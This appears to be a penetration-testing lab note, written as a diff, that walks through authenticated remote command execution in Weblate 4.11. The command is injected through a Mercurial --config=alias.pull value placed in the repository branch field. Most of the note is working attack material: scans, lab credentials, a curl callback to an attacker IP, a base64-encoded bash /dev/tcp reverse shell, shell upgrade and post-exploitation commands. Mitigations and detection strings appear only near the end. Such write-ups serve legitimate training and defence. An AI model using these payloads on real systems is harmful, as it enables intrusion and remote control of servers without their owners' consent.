@@ -1,0 +1,698 @@
+## Overview
+
+Weblate is a web-based translation platform that can integrate with version control systems.
+
+In Weblate `4.11`, authenticated users may be able to abuse repository configuration handling to achieve command execution through Mercurial options.
+
+The general attack path is:
+
+```text
+Identify Weblate service
+↓
+Confirm version
+↓
+Obtain valid credentials
+↓
+Create project
+↓
+Create translation component
+↓
+Select Mercurial as VCS
+↓
+Inject command through repository branch configuration
+↓
+Confirm callback
+↓
+Execute reverse shell
+```
+
+> [!important]
+> This technique requires authenticated access to Weblate.
+
+---
+
+# Target Indicators
+
+During enumeration, Weblate may appear on a non-standard web port.
+
+Example service discovery:
+
+```text
+8000/tcp open http-alt WSGIServer 0.2 Python 3.10.12
+http-title: Weblate
+```
+
+Example exposed routes from `robots.txt`:
+
+```text
+/admin/
+/accounts/
+/source/
+/comment/
+/commit/
+/update/
+/push/
+/reset/
+/lock/
+/unlock/
+/changes/
+/search/
+/replace/
+```
+
+Useful web paths:
+
+```text
+http://<target>:8000/
+http://<target>:8000/accounts/login/
+http://<target>:8000/create/project/
+http://<target>:8000/create/component/
+```
+
+---
+
+# Vulnerability Context
+
+Affected application:
+
+```text
+Weblate 4.11
+```
+
+Relevant vulnerability reference:
+
+- [Snyk – Weblate RCE](https://security.snyk.io/vuln/SNYK-PYTHON-WEBLATE-2414088)
+
+The issue allows command execution by abusing Mercurial configuration values passed through Weblate repository handling.
+
+In the lab guide, the vulnerable behavior was triggered by setting the repository branch to a Mercurial configuration override:
+
+```text
+--config=alias.pull=!<command>
+```
+
+This defines or overrides a Mercurial alias so that a later `pull` operation executes a shell command.
+
+---
+
+# Requirements
+
+## Required Access
+
+```text
+Valid Weblate credentials
+```
+
+Example from the lab guide:
+
+```text
+admin / niffenegger
+```
+
+## Required Conditions
+
+```text
+Weblate version 4.11
+Authenticated access to create projects/components
+Mercurial available as a VCS option
+Outbound connectivity from target to attacker
+```
+
+---
+
+# Enumeration Workflow
+
+## Full Port Scan
+
+```bash
+nmap -sT --min-rate 1000 -p- $IP -oA nmapscan/ports
+```
+
+Extract open ports:
+
+```bash
+ports=$(grep open nmapscan/ports.nmap | awk -F '/' '{print $1}' | paste -sd ',')
+```
+
+## Service and Version Scan
+
+```bash
+nmap -sT -sV -sC -O -p$ports $IP -oA nmapscan/detail
+```
+
+Example relevant output:
+
+```text
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp   open  http    Apache httpd 2.4.52
+8000/tcp open  http    WSGIServer 0.2 Python 3.10.12
+http-title: Weblate
+```
+
+---
+
+# Initial Web Recon
+
+## Port 80
+
+Check the public web application.
+
+```text
+http://<target>:80
+```
+
+In the lab guide, port `80` hosted a bookstore-themed site.
+
+Use the public site for:
+
+```text
+usernames
+author names
+email addresses
+password hints
+default credentials
+company names
+project names
+```
+
+> [!tip]
+> If Weblate requires authentication, the public-facing site may still leak useful names or password hints.
+
+---
+
+## Port 8000
+
+Check Weblate.
+
+```text
+http://<target>:8000
+```
+
+Useful checks:
+
+```text
+Is login required?
+Can the version be identified?
+Are self-registration or password reset enabled?
+Are public projects visible?
+Is /admin/ exposed?
+```
+
+---
+
+# Credential Discovery
+
+The vulnerability requires a valid Weblate login.
+
+In the lab guide, credentials were inferred from public information on the website.
+
+Example:
+
+```text
+Username: admin
+Password: niffenegger
+```
+
+> [!note]
+> Keep this as a methodology point: if authenticated exploitability is blocked, review public content for usernames, author names, password hints, or weak/default credentials.
+
+---
+
+# Exploitation Workflow
+
+## Step 1 – Log In to Weblate
+
+Navigate to:
+
+```text
+http://<target>:8000/accounts/login/
+```
+
+Authenticate with valid credentials.
+
+---
+
+## Step 2 – Create a Project
+
+Go to:
+
+```text
+http://<target>:8000/create/project/
+```
+
+Example values:
+
+| Field | Value |
+|---|---|
+| Project name | `poc` |
+| URL slug | `poc` |
+| Project website | `http://localhost` |
+
+Continue to component creation.
+
+---
+
+## Step 3 – Create a Translation Component
+
+Go to the create component workflow:
+
+```text
+http://<target>:8000/create/component/?project=<project_id>
+```
+
+Choose:
+
+```text
+New translation component
+```
+
+Continue until repository settings are available.
+
+---
+
+## Step 4 – Configure Mercurial Repository
+
+Set:
+
+| Field | Value |
+|---|---|
+| Version control system | `Mercurial` |
+| Source code repository | `http://localhost:8000` |
+| Repository branch | `--config=alias.pull=!<command>` |
+
+The key injection point is:
+
+```text
+Repository branch
+```
+
+---
+
+# Confirm Command Execution
+
+## Start Listener
+
+On the attack host:
+
+```bash
+nc -lvvp 80
+```
+
+## Inject Curl Callback
+
+Use a harmless callback first.
+
+```text
+--config=alias.pull=!curl <attacker_ip>
+```
+
+Example:
+
+```text
+--config=alias.pull=!curl 192.168.45.164
+```
+
+Expected listener output:
+
+```text
+connect to [192.168.45.164] from (UNKNOWN) [192.168.173.19]
+GET / HTTP/1.1
+Host: 192.168.45.164
+User-Agent: curl/7.81.0
+```
+
+Successful callback confirms command execution.
+
+---
+
+# Reverse Shell
+
+## Start Listener
+
+```bash
+nc -lvvp 80
+```
+
+## Prepare Base64 Payload
+
+Payload:
+
+```bash
+/bin/bash -i >& /dev/tcp/192.168.45.164/80 0>&1
+```
+
+Encode:
+
+```bash
+echo "/bin/bash -i >& /dev/tcp/192.168.45.164/80 0>&1" | base64
+```
+
+Example output:
+
+```text
+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTY0LzgwIDA+JjEK
+```
+
+## Inject Reverse Shell
+
+Set the repository branch to:
+
+```text
+--config=alias.pull=!echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTY0LzgwIDA+JjEK|base64 -d|bash
+```
+
+Expected callback:
+
+```text
+bash: cannot set terminal process group
+bash: no job control in this shell
+```
+
+Confirm user:
+
+```bash
+whoami
+```
+
+Example result from the lab guide:
+
+```text
+tom
+```
+
+---
+
+# Shell Upgrade
+
+Basic upgrade:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Background shell:
+
+```text
+CTRL+Z
+```
+
+Set local terminal:
+
+```bash
+stty raw -echo; fg
+```
+
+Set terminal type:
+
+```bash
+export TERM=xterm
+```
+
+---
+
+# Post-Exploitation Checks
+
+After getting a shell, enumerate the user and environment.
+
+```bash
+whoami
+id
+hostname
+pwd
+ls -la
+sudo -l
+```
+
+Check home directory:
+
+```bash
+cd /home/<user>
+ls -la
+```
+
+Check network and listening services:
+
+```bash
+ip a
+ss -tulpn
+```
+
+Check Weblate/application paths:
+
+```bash
+find / -iname '*weblate*' 2>/dev/null
+```
+
+```bash
+find / -path '*site-packages*' -type d 2>/dev/null
+```
+
+---
+
+# Useful Decision Points
+
+## Does Weblate Require Login?
+
+If yes:
+
+```text
+Look for credentials from the public site, usernames, weak passwords, default credentials, or reused names.
+```
+
+## Can You Create Projects or Components?
+
+If no:
+
+```text
+Authenticated user may lack permission.
+Try another account or look for privilege escalation within Weblate.
+```
+
+## Does Curl Callback Work?
+
+If yes:
+
+```text
+Command execution is confirmed.
+Move to reverse shell.
+```
+
+If no:
+
+```text
+Check outbound firewall, command syntax, listener port, attacker IP, and whether the vulnerable action was triggered.
+```
+
+## Does Reverse Shell Fail?
+
+Try:
+
+```text
+different port
+different shell payload
+wget/curl-based staged payload
+Python reverse shell
+bash TCP shell
+```
+
+---
+
+# Troubleshooting
+
+## No Callback
+
+Check:
+
+```text
+attacker IP is correct
+listener is running
+target can reach attacker
+firewall allows outbound connection
+repository branch syntax is correct
+Mercurial was selected
+component creation actually triggered VCS action
+```
+
+## Reverse Shell Breaks Because of Special Characters
+
+Use base64 encoding:
+
+```bash
+echo '<payload>' | base64
+```
+
+Then inject:
+
+```bash
+echo <base64_payload>|base64 -d|bash
+```
+
+## Weblate Does Not Trigger the Command
+
+Try:
+
+```text
+creating a new component
+changing repository settings
+forcing repository update
+using another VCS operation that triggers pull
+```
+
+## Authentication Needed
+
+Look for:
+
+```text
+public website names
+admin names
+author names
+email addresses
+default passwords
+password hints
+reused words from the site
+```
+
+---
+
+# Command Reference
+
+## Full TCP scan
+
+```bash
+nmap -sT --min-rate 1000 -p- $IP -oA nmapscan/ports
+```
+
+## Extract ports
+
+```bash
+ports=$(grep open nmapscan/ports.nmap | awk -F '/' '{print $1}' | paste -sd ',')
+```
+
+## Version scan
+
+```bash
+nmap -sT -sV -sC -O -p$ports $IP -oA nmapscan/detail
+```
+
+## Listener for test callback
+
+```bash
+nc -lvvp 80
+```
+
+## Test command execution
+
+```text
+--config=alias.pull=!curl <attacker_ip>
+```
+
+## Base64 encode reverse shell
+
+```bash
+echo "/bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1" | base64
+```
+
+## Reverse shell injection
+
+```text
+--config=alias.pull=!echo <base64_payload>|base64 -d|bash
+```
+
+## Confirm shell user
+
+```bash
+whoami
+```
+
+---
+
+# Defensive Notes
+
+## Root Cause
+
+This attack abuses unsafe handling of Mercurial repository configuration values through Weblate.
+
+A dangerous injected value looks like:
+
+```text
+--config=alias.pull=!<command>
+```
+
+This causes Mercurial to treat the alias as a shell command.
+
+## Mitigations
+
+Defensive actions:
+
+```text
+upgrade Weblate
+restrict project/component creation permissions
+validate and sanitize repository configuration fields
+restrict outbound connectivity from application servers
+run Weblate with least privilege
+monitor unusual VCS configuration values
+monitor curl/wget/bash spawned by Weblate or Python processes
+disable unsupported VCS backends if not needed
+```
+
+## Detection Ideas
+
+Look for process chains such as:
+
+```text
+python / weblate
+↓
+hg
+↓
+sh / bash
+↓
+curl / wget / nc
+```
+
+Search logs for:
+
+```text
+--config=alias.pull
+!curl
+base64 -d|bash
+/dev/tcp/
+```
+
+---
+
+# Key Takeaways
+
+- Weblate `4.11` can be vulnerable to authenticated command execution through Mercurial configuration injection.
+- Valid Weblate credentials are required.
+- The injection point is the repository branch value during component creation.
+- A safe curl callback should be used before attempting a shell.
+- Base64 encoding helps avoid quoting and special character issues.
+- The shell runs as the Weblate application user.
+- Situational awareness after the initial shell determines the privilege escalation path.
+
+---
+
+# Related Notes
+
+- [[Attacking Apps]]
+- [[Weblate]]
+- [[Authenticated RCE]]
+- [[Mercurial]]
+- [[Command Injection]]
+- [[Linux Reverse Shells]]
+- [[Linux Enumeration]]
+- [[Attacking Web Applications]]
+
+---
+
+# Tags
+
+#attacking-apps
+#weblate
+#authenticated-rce
+#mercurial
+#command-injection
+#linux
+#reverse-shell
+#offsec
+#pentesting
